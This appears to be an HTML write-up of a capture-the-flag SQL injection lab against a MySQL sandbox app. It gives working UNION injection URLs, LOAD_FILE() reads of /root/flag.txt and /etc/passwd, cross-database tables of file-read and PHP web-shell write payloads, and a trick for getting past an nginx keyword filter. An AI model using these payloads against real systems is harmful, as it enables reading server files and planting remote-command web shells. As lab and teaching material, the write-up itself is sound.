@@ -1,0 +1,627 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Lab 8.x — SQLi File Read & Write Summary</title>
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500&family=IBM+Plex+Sans:wght@400;500;600&display=swap');
+
+  :root {
+    --bg: #0d0f12;
+    --bg2: #13161b;
+    --bg3: #1a1e25;
+    --border: rgba(255,255,255,0.07);
+    --border2: rgba(255,255,255,0.12);
+    --text: #c9cdd6;
+    --text2: #7a8194;
+    --text3: #4a5068;
+    --accent: #4ade80;
+    --accent2: #22d3ee;
+    --warn: #fbbf24;
+    --danger: #f87171;
+    --purple: #a78bfa;
+    --orange: #fb923c;
+    --blue: #3b82f6;
+    --font: 'IBM Plex Sans', sans-serif;
+    --mono: 'JetBrains Mono', monospace;
+  }
+
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+
+  body {
+    background: var(--bg);
+    color: var(--text);
+    font-family: var(--font);
+    font-size: 14px;
+    line-height: 1.7;
+    min-height: 100vh;
+  }
+
+  body::before {
+    content: '';
+    position: fixed;
+    inset: 0;
+    background-image:
+      linear-gradient(rgba(255,255,255,0.015) 1px, transparent 1px),
+      linear-gradient(90deg, rgba(255,255,255,0.015) 1px, transparent 1px);
+    background-size: 32px 32px;
+    pointer-events: none;
+    z-index: 0;
+  }
+
+  .container {
+    position: relative;
+    z-index: 1;
+    max-width: 900px;
+    margin: 0 auto;
+    padding: 48px 24px 80px;
+  }
+
+  header {
+    margin-bottom: 40px;
+    padding-bottom: 28px;
+    border-bottom: 1px solid var(--border);
+  }
+  .lab-tag {
+    display: inline-block;
+    font-family: var(--mono);
+    font-size: 11px;
+    color: var(--accent);
+    background: rgba(74,222,128,0.08);
+    border: 1px solid rgba(74,222,128,0.2);
+    padding: 3px 10px;
+    border-radius: 4px;
+    margin-bottom: 12px;
+    letter-spacing: .05em;
+  }
+  h1 {
+    font-size: 26px;
+    font-weight: 600;
+    color: #e8eaf0;
+    letter-spacing: -0.02em;
+    margin-bottom: 8px;
+  }
+  .subtitle {
+    font-size: 13px;
+    color: var(--text2);
+  }
+
+  .challenge-grid {
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+    gap: 12px;
+    margin-bottom: 32px;
+  }
+  @media(max-width:600px){ .challenge-grid { grid-template-columns: 1fr; } }
+
+  .challenge-card {
+    background: var(--bg2);
+    border: 1px solid var(--border);
+    border-radius: 10px;
+    padding: 16px;
+  }
+  .challenge-card.success { border-color: rgba(74,222,128,0.2); }
+  .challenge-num {
+    font-size: 10px;
+    font-weight: 600;
+    letter-spacing: .1em;
+    text-transform: uppercase;
+    color: var(--text3);
+    margin-bottom: 6px;
+  }
+  .challenge-title {
+    font-size: 14px;
+    font-weight: 500;
+    color: #e8eaf0;
+    margin-bottom: 4px;
+  }
+  .challenge-detail {
+    font-size: 12px;
+    color: var(--text2);
+    margin-bottom: 12px;
+  }
+  .badge-ok {
+    display: inline-flex; align-items: center; gap: 4px;
+    background: rgba(74,222,128,0.1);
+    color: var(--accent);
+    border: 1px solid rgba(74,222,128,0.2);
+    border-radius: 4px;
+    padding: 2px 8px;
+    font-size: 11px;
+    font-family: var(--mono);
+  }
+  .badge-err {
+    display: inline-flex; align-items: center; gap: 4px;
+    background: rgba(248,113,113,0.1);
+    color: var(--danger);
+    border: 1px solid rgba(248,113,113,0.2);
+    border-radius: 4px;
+    padding: 2px 8px;
+    font-size: 11px;
+    font-family: var(--mono);
+  }
+
+  h2 {
+    font-size: 16px;
+    font-weight: 600;
+    color: #e8eaf0;
+    margin: 36px 0 16px;
+    padding-bottom: 8px;
+    border-bottom: 1px solid var(--border);
+    display: flex;
+    align-items: center;
+    gap: 10px;
+  }
+  h2 .num {
+    width: 24px; height: 24px;
+    background: var(--bg3);
+    border: 1px solid var(--border2);
+    border-radius: 6px;
+    display: flex; align-items: center; justify-content: center;
+    font-size: 11px;
+    font-family: var(--mono);
+    color: var(--text2);
+    flex-shrink: 0;
+  }
+
+  h3 {
+    font-size: 13px;
+    font-weight: 600;
+    color: var(--text2);
+    text-transform: uppercase;
+    letter-spacing: .07em;
+    margin: 20px 0 10px;
+  }
+
+  p { color: var(--text); margin-bottom: 12px; font-size: 14px; }
+
+  .code-block {
+    background: var(--bg);
+    border: 1px solid var(--border);
+    border-radius: 8px;
+    overflow: hidden;
+    margin-bottom: 12px;
+  }
+  .code-header {
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    padding: 7px 12px;
+    border-bottom: 1px solid var(--border);
+    background: var(--bg2);
+  }
+  .code-lang {
+    font-family: var(--mono);
+    font-size: 10px;
+    color: var(--text3);
+    text-transform: uppercase;
+    letter-spacing: .08em;
+  }
+  .copy-btn {
+    font-family: var(--font);
+    font-size: 10px;
+    color: var(--text3);
+    background: var(--bg3);
+    border: 1px solid var(--border);
+    border-radius: 4px;
+    padding: 2px 8px;
+    cursor: pointer;
+    transition: color .15s, border-color .15s;
+  }
+  .copy-btn:hover { color: var(--text2); border-color: var(--border2); }
+  .copy-btn.copied { color: var(--accent); border-color: rgba(74,222,128,0.3); }
+  pre {
+    font-family: var(--mono);
+    font-size: 12px;
+    color: var(--accent2);
+    padding: 14px 16px;
+    overflow-x: auto;
+    line-height: 1.8;
+    white-space: pre-wrap;
+    word-break: break-all;
+  }
+
+  code {
+    font-family: var(--mono);
+    font-size: 12px;
+    background: var(--bg3);
+    border: 1px solid var(--border);
+    padding: 1px 6px;
+    border-radius: 4px;
+    color: var(--accent2);
+  }
+
+  .tip {
+    background: rgba(251,191,36,0.06);
+    border: 1px solid rgba(251,191,36,0.15);
+    border-radius: 8px;
+    padding: 12px 16px;
+    font-size: 13px;
+    color: var(--text2);
+    margin-bottom: 16px;
+    line-height: 1.7;
+  }
+  .tip strong { color: #e8eaf0; }
+  .tip code { font-size: 11px; color: var(--warn); background: rgba(251,191,36,0.1); border-color: rgba(251,191,36,0.2); }
+
+  .tip-danger {
+    background: rgba(248,113,113,0.06);
+    border-color: rgba(248,113,113,0.15);
+  }
+  .tip-danger code { color: var(--danger); background: rgba(248,113,113,0.1); border-color: rgba(248,113,113,0.2); }
+
+  .step {
+    display: flex;
+    gap: 14px;
+    margin-bottom: 20px;
+  }
+  .step-num {
+    width: 28px; height: 28px;
+    background: var(--bg3);
+    border: 1px solid var(--border2);
+    border-radius: 50%;
+    display: flex; align-items: center; justify-content: center;
+    font-size: 12px;
+    font-family: var(--mono);
+    color: var(--text2);
+    flex-shrink: 0;
+    margin-top: 2px;
+  }
+  .step-body { flex: 1; }
+  .step-title {
+    font-size: 14px;
+    font-weight: 500;
+    color: #e8eaf0;
+    margin-bottom: 8px;
+  }
+
+  .findings-grid {
+    display: grid;
+    grid-template-columns: repeat(3, 1fr);
+    gap: 10px;
+    margin-bottom: 20px;
+  }
+  @media(max-width:600px){ .findings-grid { grid-template-columns: 1fr 1fr; } }
+
+  .finding-card {
+    background: var(--bg2);
+    border: 1px solid var(--border);
+    border-radius: 8px;
+    padding: 12px;
+  }
+  .finding-label {
+    font-size: 10px;
+    color: var(--text3);
+    text-transform: uppercase;
+    letter-spacing: .08em;
+    margin-bottom: 4px;
+  }
+  .finding-value {
+    font-family: var(--mono);
+    font-size: 12px;
+    color: var(--accent2);
+  }
+  .finding-value.ok { color: var(--accent); }
+  .finding-value.fail { color: var(--danger); }
+
+  .ref-table {
+    width: 100%;
+    border-collapse: collapse;
+    font-size: 12px;
+    margin-bottom: 16px;
+    background: var(--bg2);
+    border-radius: 8px;
+    overflow: hidden;
+    border: 1px solid var(--border);
+  }
+  .ref-table th {
+    text-align: left;
+    padding: 9px 12px;
+    font-weight: 500;
+    font-size: 11px;
+    border-bottom: 1px solid var(--border2);
+    background: var(--bg3);
+    color: var(--text2);
+  }
+  .ref-table td {
+    padding: 8px 12px;
+    border-bottom: 1px solid var(--border);
+    color: var(--text2);
+    vertical-align: top;
+  }
+  .ref-table tr:last-child td { border-bottom: none; }
+  .ref-table td:first-child { color: var(--text); font-weight: 500; }
+  .ref-table td code { font-size: 11px; }
+
+  footer {
+    text-align: center;
+    font-size: 11px;
+    color: var(--text3);
+    margin-top: 60px;
+    padding-top: 24px;
+    border-top: 1px solid var(--border);
+  }
+</style>
+</head>
+<body>
+<div class="container">
+
+  <header>
+    <div class="lab-tag">LAB — SQLi File Read & Write</div>
+    <h1>Reading & Writing Files via SQL Injection</h1>
+    <div class="subtitle">App: <code>sql-sandbox/extramile</code> &nbsp;·&nbsp; DB: MySQL &nbsp;·&nbsp; Injection: <code>GET ?id=</code></div>
+  </header>
+
+  <!-- Challenge overview -->
+  <div class="challenge-grid">
+    <div class="challenge-card success">
+      <div class="challenge-num">Challenge 1</div>
+      <div class="challenge-title">Extract flag from <code>flags</code> table</div>
+      <div class="challenge-detail">UNION-based injection via the <code>id</code> parameter</div>
+      <span class="badge-ok">✓ Solved — UNION SELECT</span>
+    </div>
+    <div class="challenge-card success">
+      <div class="challenge-num">Challenge 2</div>
+      <div class="challenge-title">Read <code>/root/flag.txt</code></div>
+      <div class="challenge-detail">File read via MySQL LOAD_FILE() — web shell blocked</div>
+      <span class="badge-ok">✓ Solved — LOAD_FILE()</span>
+    </div>
+  </div>
+
+  <!-- Recon findings -->
+  <h2><span class="num">1</span> Recon Findings</h2>
+
+  <div class="findings-grid">
+    <div class="finding-card">
+      <div class="finding-label">Injection Point</div>
+      <div class="finding-value">GET ?id=</div>
+    </div>
+    <div class="finding-card">
+      <div class="finding-label">Database</div>
+      <div class="finding-value">MySQL (mysqli)</div>
+    </div>
+    <div class="finding-card">
+      <div class="finding-label">Column Count</div>
+      <div class="finding-value">2</div>
+    </div>
+    <div class="finding-card">
+      <div class="finding-label">Web Root</div>
+      <div class="finding-value">/var/www/html/</div>
+    </div>
+    <div class="finding-card">
+      <div class="finding-label">File Write</div>
+      <div class="finding-value fail">✗ Blocked</div>
+    </div>
+    <div class="finding-card">
+      <div class="finding-label">File Read</div>
+      <div class="finding-value ok">✓ Allowed</div>
+    </div>
+  </div>
+
+  <p>The error message from injecting a single quote revealed the database type, web root path, and PHP file locations — all critical recon from a single test.</p>
+
+  <div class="code-block">
+    <div class="code-header"><span class="code-lang">Error revealed</span></div>
+    <pre>Fatal error: Uncaught Error: Call to a member function fetch_all() on boolean
+in /var/www/html/notes.php:59
+getNoteById(Object(mysqli), '3'') #1 {main}
+thrown in /var/www/html/notes.php on line 59</pre>
+  </div>
+
+  <!-- Challenge 1 -->
+  <h2><span class="num">2</span> Challenge 1 — Flag from flags Table</h2>
+
+  <div class="step">
+    <div class="step-num">1</div>
+    <div class="step-body">
+      <div class="step-title">Confirm injection with single quote</div>
+      <div class="code-block">
+        <div class="code-header"><span class="code-lang">browser</span><button class="copy-btn" onclick="copy(this)">copy</button></div>
+        <pre>http://sql-sandbox/extramile/index.php?id=3'</pre>
+      </div>
+      <p>Returned a fatal error → confirmed injectable.</p>
+    </div>
+  </div>
+
+  <div class="step">
+    <div class="step-num">2</div>
+    <div class="step-body">
+      <div class="step-title">Find column count with ORDER BY</div>
+      <div class="code-block">
+        <div class="code-header"><span class="code-lang">browser</span><button class="copy-btn" onclick="copy(this)">copy</button></div>
+        <pre>http://sql-sandbox/extramile/index.php?id=3 ORDER BY 2-- -
+http://sql-sandbox/extramile/index.php?id=3 ORDER BY 3-- -  ← errored = 2 columns</pre>
+      </div>
+      <p>ORDER BY 3 errored → <strong style="color:#e8eaf0">2 columns confirmed.</strong></p>
+    </div>
+  </div>
+
+  <div class="step">
+    <div class="step-num">3</div>
+    <div class="step-body">
+      <div class="step-title">Extract flag via UNION — URL encoded for nginx</div>
+      <div class="code-block">
+        <div class="code-header"><span class="code-lang">URL encoded — paste in browser</span><button class="copy-btn" onclick="copy(this)">copy</button></div>
+        <pre>http://sql-sandbox/extramile/index.php?id=-1%20UNION%20SELECT%20NULL%2Cflag%20FROM%20flags--%20-</pre>
+      </div>
+      <div class="code-block">
+        <div class="code-header"><span class="code-lang">decoded SQL</span></div>
+        <pre>id=-1 UNION SELECT NULL,flag FROM flags-- -</pre>
+      </div>
+      <p>Using <code>id=-1</code> suppresses the real row so only the injected flag row returns.</p>
+    </div>
+  </div>
+
+  <!-- Challenge 2 -->
+  <h2><span class="num">3</span> Challenge 2 — Read /root/flag.txt</h2>
+
+  <div class="step">
+    <div class="step-num">1</div>
+    <div class="step-body">
+      <div class="step-title">Check secure_file_priv — where can MySQL write?</div>
+      <div class="code-block">
+        <div class="code-header"><span class="code-lang">URL encoded</span><button class="copy-btn" onclick="copy(this)">copy</button></div>
+        <pre>http://sql-sandbox/extramile/index.php?id=-1%20UNION%20SELECT%20NULL%2C(SELECT%20@@global.secure_file_priv)--%20-</pre>
+      </div>
+      <p>Returned <strong style="color:#e8eaf0">NULL</strong> → file writing completely disabled for this MySQL user.</p>
+    </div>
+  </div>
+
+  <div class="step">
+    <div class="step-num">2</div>
+    <div class="step-body">
+      <div class="step-title">Web shell write blocked — pivot to LOAD_FILE()</div>
+      <div class="tip tip-danger">
+        ⚠ <strong>INTO OUTFILE</strong> failed because <code>secure_file_priv = NULL</code>. MySQL user had read privileges but not write. Always check <code>secure_file_priv</code> before attempting file write.
+      </div>
+    </div>
+  </div>
+
+  <div class="step">
+    <div class="step-num">3</div>
+    <div class="step-body">
+      <div class="step-title">Read /root/flag.txt directly via LOAD_FILE()</div>
+      <div class="code-block">
+        <div class="code-header"><span class="code-lang">URL encoded — paste in browser</span><button class="copy-btn" onclick="copy(this)">copy</button></div>
+        <pre>http://sql-sandbox/extramile/index.php?id=-1%20UNION%20SELECT%20NULL%2CLOAD_FILE('/root/flag.txt')--%20-</pre>
+      </div>
+      <div class="code-block">
+        <div class="code-header"><span class="code-lang">decoded SQL</span></div>
+        <pre>id=-1 UNION SELECT NULL,LOAD_FILE('/root/flag.txt')-- -</pre>
+      </div>
+      <p>Flag returned directly in the page — MySQL user had FILE privilege even without write access.</p>
+    </div>
+  </div>
+
+  <!-- File Read/Write Reference -->
+  <h2><span class="num">4</span> File Read & Write Reference — All DB Types</h2>
+
+  <h3>File Read</h3>
+  <table class="ref-table">
+    <tr>
+      <th>Database</th>
+      <th>Method</th>
+      <th>Payload</th>
+    </tr>
+    <tr>
+      <td>MySQL</td>
+      <td>LOAD_FILE()</td>
+      <td><code>SELECT LOAD_FILE('/etc/passwd')</code></td>
+    </tr>
+    <tr>
+      <td>PostgreSQL</td>
+      <td>pg_read_file()</td>
+      <td><code>SELECT pg_read_file('/tmp/flag.txt')</code></td>
+    </tr>
+    <tr>
+      <td>PostgreSQL</td>
+      <td>COPY FROM</td>
+      <td><code>CREATE TEMP TABLE t(c text); COPY t FROM '/tmp/flag.txt'; SELECT * FROM t;</code></td>
+    </tr>
+    <tr>
+      <td>MSSQL</td>
+      <td>BULK INSERT</td>
+      <td><code>BULK INSERT tmp FROM 'C:\flag.txt' WITH (ROWTERMINATOR='\n')</code></td>
+    </tr>
+    <tr>
+      <td>MSSQL</td>
+      <td>OPENROWSET</td>
+      <td><code>SELECT * FROM OPENROWSET(BULK 'C:\flag.txt', SINGLE_CLOB) AS f</code></td>
+    </tr>
+  </table>
+
+  <h3>File Write (Web Shell)</h3>
+  <table class="ref-table">
+    <tr>
+      <th>Database</th>
+      <th>Method</th>
+      <th>Payload</th>
+    </tr>
+    <tr>
+      <td>MySQL</td>
+      <td>INTO OUTFILE</td>
+      <td><code>UNION SELECT 1,'&lt;?php system($_GET["cmd"]); ?&gt;' INTO OUTFILE '/var/www/html/shell.php'</code></td>
+    </tr>
+    <tr>
+      <td>PostgreSQL</td>
+      <td>COPY TO</td>
+      <td><code>COPY (SELECT '&lt;?php system($_GET["cmd"]); ?&gt;') TO '/var/www/html/shell.php'</code></td>
+    </tr>
+    <tr>
+      <td>MSSQL</td>
+      <td>xp_cmdshell</td>
+      <td><code>EXEC xp_cmdshell 'echo ^&lt;?php system($_GET["cmd"]);?^&gt; > C:\inetpub\wwwroot\shell.php'</code></td>
+    </tr>
+  </table>
+
+  <h3>Check file write permissions first</h3>
+  <div class="code-block">
+    <div class="code-header"><span class="code-lang">MySQL — check secure_file_priv</span><button class="copy-btn" onclick="copy(this)">copy</button></div>
+    <pre>SELECT @@global.secure_file_priv</pre>
+  </div>
+
+  <table class="ref-table">
+    <tr>
+      <th>secure_file_priv value</th>
+      <th>Meaning</th>
+    </tr>
+    <tr>
+      <td><code>""</code> (empty string)</td>
+      <td>Can read/write anywhere</td>
+    </tr>
+    <tr>
+      <td><code>/var/lib/mysql-files/</code></td>
+      <td>Can only read/write in that directory</td>
+    </tr>
+    <tr>
+      <td><code>NULL</code></td>
+      <td>File operations completely disabled</td>
+    </tr>
+  </table>
+
+  <div class="tip">
+    <strong>Key lesson:</strong> Even when <code>secure_file_priv = NULL</code> blocks file writes, the MySQL user may still have the <code>FILE</code> privilege allowing <code>LOAD_FILE()</code> reads. Always test both independently — write and read are controlled separately.
+  </div>
+
+  <!-- nginx tip -->
+  <h2><span class="num">5</span> Bypassing nginx 400 Bad Request</h2>
+  <p>nginx blocked SQL keywords in the raw URL. The fix was to paste payloads directly in the browser address bar — the browser automatically URL encodes spaces and special characters.</p>
+
+  <div class="code-block">
+    <div class="code-header"><span class="code-lang">Key URL encodings</span></div>
+    <pre>space → %20
+'     → %27
+,     → %2C
+(     → %28
+)     → %29
+=     → %3D
+;     → %3B</pre>
+  </div>
+
+  <div class="tip">
+    <strong>Tip:</strong> When nginx blocks requests with SQL in the URL, paste the decoded payload directly into the browser bar and let it encode automatically. Alternatively in Burp, highlight the payload and press <code>Ctrl+U</code> to URL encode.
+  </div>
+
+  <footer>
+    SQLi File Read & Write Lab &nbsp;·&nbsp; For authorized CTF / lab use only
+  </footer>
+
+</div>
+
+<script>
+function copy(btn) {
+  const pre = btn.closest('.code-block').querySelector('pre');
+  const text = pre.innerText.trim();
+  navigator.clipboard.writeText(text).then(() => {
+    btn.textContent = 'copied!';
+    btn.classList.add('copied');
+    setTimeout(() => {
+      btn.textContent = 'copy';
+      btn.classList.remove('copied');
+    }, 1500);
+  });
+}
+</script>
+</body>
+</html>
